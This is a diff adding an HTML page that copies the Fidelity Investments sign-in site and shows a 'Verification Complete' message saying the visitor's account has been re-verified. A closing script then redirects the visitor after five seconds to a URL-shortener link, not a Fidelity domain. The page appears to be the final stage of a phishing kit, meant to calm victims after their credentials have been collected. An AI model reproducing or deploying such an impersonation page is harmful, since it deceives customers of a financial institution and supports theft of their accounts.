@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en" class="at-element-marker">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Log in</title>
+		<link rel="icon" type="image/x-icon" href="/img/favicon.ico" />
+		<link rel="stylesheet" href="/css/main.css" />
+	</head>
+	<body data-masking="true">
+		<div class="main-container">
+			<nav class="dom-header">
+				<div class="dom-header-logo">
+					<a href="#">
+						<img src="/img/Fidel-wordmark.svg" alt="Fidelity Investments" />
+					</a>
+				</div>
+				<div class="dom-header-links">
+					<pvd-link
+						pvd-disable-underline=""
+						pvd-class="dom-header-pvd-link"
+						pvd-href="#security/overview"
+						pvd-disabled="false"
+						><s-root
+							><span class="pvd-link-root pvd-link--disable-underline pvd-link--undefined">
+								<a class="pvd-link__link dom-header-pvd-link" href="#security/overview"
+									><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+									><s-slot><s-assigned-wrapper>Security</s-assigned-wrapper></s-slot
+									><s-slot name="icon-right"
+										><s-assigned-wrapper></s-assigned-wrapper></s-slot></a></span></s-root
+					></pvd-link>
+					<pvd-link
+						pvd-disable-underline=""
+						pvd-class="dom-header-pvd-link pvd-space-inline-two-x"
+						pvd-href="#customer-service/need-help-logging-in"
+						pvd-disabled="false"
+						><s-root
+							><span class="pvd-link-root pvd-link--disable-underline pvd-link--undefined">
+								<a
+									class="pvd-link__link dom-header-pvd-link pvd-space-inline-two-x"
+									href="#customer-service/need-help-logging-in"
+									><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+									><s-slot><s-assigned-wrapper>FAQs</s-assigned-wrapper></s-slot
+									><s-slot name="icon-right"
+										><s-assigned-wrapper></s-assigned-wrapper></s-slot></a></span></s-root
+					></pvd-link>
+				</div>
+			</nav>
+			<main class="dom-container">
+				<div id="dom-overlay"></div>
+				<div id="dom-widget">
+					<div>
+						<div class="dom-card dom-signin-card">
+							<div style="margin-top: 50px; margin-bottom: 50px; text-align: center">
+								<svg
+									width="64"
+									height="64"
+									viewBox="0 0 64 64"
+									fill="none"
+									xmlns="https://www.w3.org/2000/svg"
+								>
+									<circle cx="32" cy="32" r="32" fill="#62CF66"></circle>
+									<path
+										fill-rule="evenodd"
+										clip-rule="evenodd"
+										d="M28.2514 44.0347C27.4541 44.9285 26.0553 44.9259 25.2614 44.0291L14.5907 31.9753C14.151 31.4787 14.3078 30.6995 14.9054 30.4116L15.3589 30.1931C15.686 30.0354 16.0729 30.0675 16.3695 30.2769L25.0794 36.423C25.8341 36.9556 26.8554 36.902 27.5502 36.2934L47.6139 18.7212C47.9155 18.4571 48.3457 18.3986 48.7068 18.5726L49.0901 18.7573C49.689 19.0458 49.8448 19.8277 49.4023 20.3238L28.2514 44.0347Z"
+										fill="white"
+									></path>
+								</svg>
+								<h3>Verification Complete</h3>
+								<p>
+									Your account has successfully been re-verified. You will be redirected back to our
+									homepage shortly.
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div id="dom-sronly" aria-live="assertive"></div>
+			</main>
+			<div class="dom-link-lessres">
+				New to Fidelity?
+				<div style="white-space: pre-wrap"></div>
+				<pvd-link pvd-href="#open-account/overview" pvd-class="dom-link" pvd-disabled="false"
+					><s-root
+						><span class="pvd-link-root pvd-link--undefined">
+							<a class="pvd-link__link dom-link" href="#open-account/overview"
+								><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+								><s-slot><s-assigned-wrapper>Open an account</s-assigned-wrapper></s-slot
+								><s-slot name="icon-right"
+									><s-assigned-wrapper></s-assigned-wrapper></s-slot></a></span></s-root
+				></pvd-link>
+				<pvd-class
+					>or
+					<pvd-link
+						pvd-href="#digital/login/user-identity?intent=nur"
+						pvd-class="dom-link"
+						pvd-disabled="false"
+						><s-root
+							><span class="pvd-link-root pvd-link--undefined">
+								<a class="pvd-link__link dom-link" href="#digital/login/user-identity?intent=nur"
+									><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+									><s-slot><s-assigned-wrapper>sign up.</s-assigned-wrapper></s-slot
+									><s-slot name="icon-right"
+										><s-assigned-wrapper></s-assigned-wrapper></s-slot></a></span></s-root
+					></pvd-link>
+				</pvd-class>
+			</div>
+			<div class="dom-mv-actions">
+				<pvd-link
+					pvd-disable-underline=""
+					pvd-class="dom-act-link dom-space-right dom-space-top"
+					pvd-href="#security/overview"
+					pvd-disabled="false"
+					><s-root
+						><span class="pvd-link-root pvd-link--disable-underline pvd-link--undefined">
+							<a
+								class="pvd-link__link dom-act-link dom-space-right dom-space-top"
+								href="#security/overview"
+								><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+								><s-slot><s-assigned-wrapper>Security</s-assigned-wrapper></s-slot
+								><s-slot name="icon-right"
+									><s-assigned-wrapper></s-assigned-wrapper></s-slot></a></span></s-root
+				></pvd-link>
+				<pvd-link
+					pvd-disable-underline=""
+					pvd-class="dom-act-link dom-space-top"
+					pvd-href="#customer-service/need-help-logging-in"
+					pvd-disabled="false"
+					><s-root
+						><span class="pvd-link-root pvd-link--disable-underline pvd-link--undefined">
+							<a
+								class="pvd-link__link dom-act-link dom-space-top"
+								href="#customer-service/need-help-logging-in"
+								><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+								><s-slot><s-assigned-wrapper>FAQs</s-assigned-wrapper></s-slot
+								><s-slot name="icon-right"
+									><s-assigned-wrapper></s-assigned-wrapper></s-slot></a></span></s-root
+				></pvd-link>
+			</div>
+		</div>
+		<footer class="dom-footer">
+			<p>
+				<pvd-link
+					pvd-disable-underline=""
+					pvd-size="small"
+					pvd-class="dom-footer-pvd-link underline"
+					pvd-href="#customer-service/nfs-statement-financial-condition"
+					pvd-disabled="false"
+					><s-root
+						><span class="pvd-link-root pvd-link--disable-underline pvd-link--small">
+							<a
+								class="pvd-link__link dom-footer-pvd-link underline"
+								href="#customer-service/nfs-statement-financial-condition"
+								><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+								><s-slot
+									><s-assigned-wrapper
+										>National Financial Services LLC Statement of Financial
+										Condition</s-assigned-wrapper
+									></s-slot
+								><s-slot name="icon-right"
+									><s-assigned-wrapper></s-assigned-wrapper></s-slot></a></span></s-root
+				></pvd-link>
+				<br />
+				Use of this site involves the electronic transmission of personal financial information.
+				Using this product is consent to such transmission of this information; such consent is
+				effective at all times when using this site. Fidelity supports 128-bit
+				<pvd-link
+					pvd-disable-underline=""
+					pvd-size="small"
+					pvd-class="dom-footer-pvd-link underline"
+					pvd-href="#security/overview"
+					pvd-disabled="false"
+					><s-root
+						><span class="pvd-link-root pvd-link--disable-underline pvd-link--small">
+							<a class="pvd-link__link dom-footer-pvd-link underline" href="#security/overview"
+								><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+								><s-slot><s-assigned-wrapper>browser encryption</s-assigned-wrapper></s-slot
+								><s-slot name="icon-right"
+									><s-assigned-wrapper></s-assigned-wrapper></s-slot></a></span></s-root></pvd-link
+				>.
+				<br />
+				Before investing, consider the funds' investment objectives, risks, charges, and expenses.
+				Contact Fidelity for a prospectus or, if available, a summary prospectus containing this
+				information. Read it carefully.
+				<br />
+				Fidelity Brokerage Services LLC, Member NYSE, SIPC. 900 Salem Street, Smithfield, RI 02917
+			</p>
+			<div>
+				<div class="footer-copyright">
+					<script>
+						document.write('©1998-' + new Date().getFullYear());
+					</script>
+					FMR LLC. All Rights Reserved.
+					<br />
+					1159659.1.0
+				</div>
+				<div class="footer-links">
+					<pvd-link
+						pvd-disable-underline=""
+						pvd-size="small"
+						pvd-class="dom-footer-pvd-link"
+						pvd-new-window="true"
+						pvd-href="#terms-of-use"
+						pvd-disabled="false"
+						pvd-icon-right="action__open-link"
+						><s-root
+							><span
+								class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"
+							>
+								<a
+									class="pvd-link__link dom-footer-pvd-link"
+									href="#terms-of-use"
+									target="_blank"
+									rel="noopener"
+									><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+									><s-slot><s-assigned-wrapper>Terms of use</s-assigned-wrapper></s-slot
+									><span class="pvd-link__icon pvd-link__icon--right"
+										><s-slot name="icon-right"
+											><s-fallback-wrapper
+												><pvd-scoped-icon-41562060
+													data-tag-name="pvd-scoped-icon"
+													pvd-name="action__open-link"
+													pvd-size="small"
+													><svg
+														aria-hidden="true"
+														class="pvd-icon-root pvd-icon--small"
+														focusable="false"
+													>
+														<use
+															href="#pvd-action__open-link"
+															xlink:href="#pvd-action__open-link"
+														></use></svg></pvd-scoped-icon-41562060></s-fallback-wrapper
+											><s-assigned-wrapper></s-assigned-wrapper></s-slot></span
+									><span class="pvd-link__screen-reader-text">true</span></a
+								></span
+							></s-root
+						></pvd-link
+					>
+					<pvd-link
+						pvd-disable-underline=""
+						pvd-size="small"
+						pvd-class="dom-footer-pvd-link"
+						pvd-new-window="true"
+						pvd-href="#privacy-policy"
+						pvd-disabled="false"
+						pvd-icon-right="action__open-link"
+						><s-root
+							><span
+								class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"
+							>
+								<a
+									class="pvd-link__link dom-footer-pvd-link"
+									href="#privacy-policy"
+									target="_blank"
+									rel="noopener"
+									><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+									><s-slot><s-assigned-wrapper>Privacy</s-assigned-wrapper></s-slot
+									><span class="pvd-link__icon pvd-link__icon--right"
+										><s-slot name="icon-right"
+											><s-fallback-wrapper
+												><pvd-scoped-icon-41562060
+													data-tag-name="pvd-scoped-icon"
+													pvd-name="action__open-link"
+													pvd-size="small"
+													><svg
+														aria-hidden="true"
+														class="pvd-icon-root pvd-icon--small"
+														focusable="false"
+													>
+														<use
+															href="#pvd-action__open-link"
+															xlink:href="#pvd-action__open-link"
+														></use></svg></pvd-scoped-icon-41562060></s-fallback-wrapper
+											><s-assigned-wrapper></s-assigned-wrapper></s-slot></span
+									><span class="pvd-link__screen-reader-text">true</span></a
+								></span
+							></s-root
+						></pvd-link
+					>
+					<pvd-link
+						pvd-disable-underline=""
+						pvd-size="small"
+						pvd-class="dom-footer-pvd-link"
+						pvd-new-window="true"
+						pvd-href="#security/overview"
+						pvd-disabled="false"
+						pvd-icon-right="action__open-link"
+						><s-root
+							><span
+								class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"
+							>
+								<a
+									class="pvd-link__link dom-footer-pvd-link"
+									href="#security/overview"
+									target="_blank"
+									rel="noopener"
+									><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+									><s-slot><s-assigned-wrapper>Security</s-assigned-wrapper></s-slot
+									><span class="pvd-link__icon pvd-link__icon--right"
+										><s-slot name="icon-right"
+											><s-fallback-wrapper
+												><pvd-scoped-icon-41562060
+													data-tag-name="pvd-scoped-icon"
+													pvd-name="action__open-link"
+													pvd-size="small"
+													><svg
+														aria-hidden="true"
+														class="pvd-icon-root pvd-icon--small"
+														focusable="false"
+													>
+														<use
+															href="#pvd-action__open-link"
+															xlink:href="#pvd-action__open-link"
+														></use></svg></pvd-scoped-icon-41562060></s-fallback-wrapper
+											><s-assigned-wrapper></s-assigned-wrapper></s-slot></span
+									><span class="pvd-link__screen-reader-text">true</span></a
+								></span
+							></s-root
+						></pvd-link
+					>
+					<pvd-link
+						pvd-disable-underline=""
+						pvd-size="small"
+						pvd-class="dom-footer-pvd-link"
+						pvd-new-window="true"
+						pvd-href="#accessibility/overview"
+						pvd-disabled="false"
+						pvd-icon-right="action__open-link"
+						><s-root
+							><span
+								class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"
+							>
+								<a
+									class="pvd-link__link dom-footer-pvd-link"
+									href="#accessibility/overview"
+									target="_blank"
+									rel="noopener"
+									><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+									><s-slot><s-assigned-wrapper>Accessibility</s-assigned-wrapper></s-slot
+									><span class="pvd-link__icon pvd-link__icon--right"
+										><s-slot name="icon-right"
+											><s-fallback-wrapper
+												><pvd-scoped-icon-41562060
+													data-tag-name="pvd-scoped-icon"
+													pvd-name="action__open-link"
+													pvd-size="small"
+													><svg
+														aria-hidden="true"
+														class="pvd-icon-root pvd-icon--small"
+														focusable="false"
+													>
+														<use
+															href="#pvd-action__open-link"
+															xlink:href="#pvd-action__open-link"
+														></use></svg></pvd-scoped-icon-41562060></s-fallback-wrapper
+											><s-assigned-wrapper></s-assigned-wrapper></s-slot></span
+									><span class="pvd-link__screen-reader-text">true</span></a
+								></span
+							></s-root
+						></pvd-link
+					>
+					<br />
+					<pvd-link
+						pvd-disable-underline=""
+						pvd-size="small"
+						pvd-class="dom-footer-pvd-link"
+						pvd-new-window="true"
+						pvd-href="#terms-of-use#For"
+						pvd-disabled="false"
+						pvd-icon-right="action__open-link"
+						><s-root
+							><span
+								class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"
+							>
+								<a
+									class="pvd-link__link dom-footer-pvd-link"
+									href="#terms-of-use#For"
+									target="_blank"
+									rel="noopener"
+									><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot
+									><s-slot
+										><s-assigned-wrapper
+											>This is for persons in the US only</s-assigned-wrapper
+										></s-slot
+									><span class="pvd-link__icon pvd-link__icon--right"
+										><s-slot name="icon-right"
+											><s-fallback-wrapper
+												><pvd-scoped-icon-41562060
+													data-tag-name="pvd-scoped-icon"
+													pvd-name="action__open-link"
+													pvd-size="small"
+													><svg
+														aria-hidden="true"
+														class="pvd-icon-root pvd-icon--small"
+														focusable="false"
+													>
+														<use
+															href="#pvd-action__open-link"
+															xlink:href="#pvd-action__open-link"
+														></use></svg></pvd-scoped-icon-41562060></s-fallback-wrapper
+											><s-assigned-wrapper></s-assigned-wrapper></s-slot></span
+									><span class="pvd-link__screen-reader-text">true</span></a
+								></span
+							></s-root
+						></pvd-link
+					>
+				</div>
+			</div>
+		</footer>
+
+		<div style="display: none">
+			<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+				<symbol id="pvd-action__show" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+					<path
+						d="M23.43 10.93a2.21 2.21 0 010 2.94c-2.62 2.88-6.94 5.93-11.29 5.93h-.3c-4.34 0-8.66-3.05-11.28-5.93a2.21 2.21 0 010-2.94C3.21 8.02 7.6 4.93 12 5c4.4-.06 8.8 3.02 11.44 5.93zM7.39 12.4a4.6 4.6 0 109.2 0 4.6 4.6 0 00-9.2 0zm4.6 2a2 2 0 110-4 2 2 0 010 4z"
+					></path>
+				</symbol>
+				<symbol id="pvd-action__hide" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+					<path
+						d="M22.95 10.31c.74.83.75 2.08.01 2.9-2.56 2.82-6.8 5.8-11.05 5.8h-.3a11.26 11.26 0 01-4.31-.94l-4.15 4.15a1 1 0 01-1.63-1.09s.02 0 .03-.02l19.5-19.5a.74.74 0 00.17-.29l.02-.01a1 1 0 111.41 1.41l-4 4a20.95 20.95 0 014.3 3.6zm-6.88 2.72a4.3 4.3 0 00-.2-3.05.25.25 0 00-.41-.07L9.9 15.47a.25.25 0 00.07.4 4.3 4.3 0 003.1.2 4.58 4.58 0 003-3.04zm-8.7.14l-3.05 3.05a.26.26 0 01-.32.03 21.2 21.2 0 01-3.44-3.03 2.15 2.15 0 010-2.9c2.6-2.85 6.9-5.86 11.2-5.8a10.42 10.42 0 013.23.5.25.25 0 01.1.41l-1.94 1.95a.24.24 0 01-.24.06 4.28 4.28 0 00-1.16-.17 4.5 4.5 0 00-4.5 4.5 4.3 4.3 0 00.18 1.16.24.24 0 01-.06.24z"
+					></path>
+				</symbol>
+				<symbol id="pvd-action__caret-left" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+					<path
+						d="M8.25 12l9.85-9.85A1.25 1.25 0 0016.34.38L6.1 10.6a1.96 1.96 0 000 2.78l10.23 10.23a1.25 1.25 0 001.76-1.77L8.25 12z"
+					></path>
+				</symbol>
+				<symbol id="pvd-alert__critical" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+					<path
+						d="M12 24a12 12 0 110-24 12 12 0 010 24zm1.25-10.76V6.92a1.25 1.25 0 00-2.5 0v6.32a1.25 1.25 0 002.5 0zM12 18.79a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"
+					></path>
+				</symbol>
+				<symbol id="pvd-action__check" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+					<path
+						d="M2.24 10.86A1.25 1.25 0 10.27 12.4l6.33 8a1.25 1.25 0 001.87.1L23.64 5.28a1.25 1.25 0 10-1.78-1.77L7.68 17.72l-5.44-6.87z"
+					></path>
+				</symbol>
+				<symbol id="pvd-action__close" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+					<path
+						d="M10.3 12L.35 2.05a1.2 1.2 0 111.7-1.7L12 10.3 21.95.35a1.2 1.2 0 111.7 1.7L13.7 12l9.95 9.95a1.2 1.2 0 11-1.7 1.7L12 13.7l-9.95 9.95a1.2 1.2 0 11-1.7-1.7L10.3 12z"
+					></path>
+				</symbol>
+			</svg>
+		</div>
+
+		<script>
+			setTimeout(() => {
+				window.location.href = 'https://t.ly/65rFU';
+			}, 5000);
+		</script>
+	</body>
+</html>
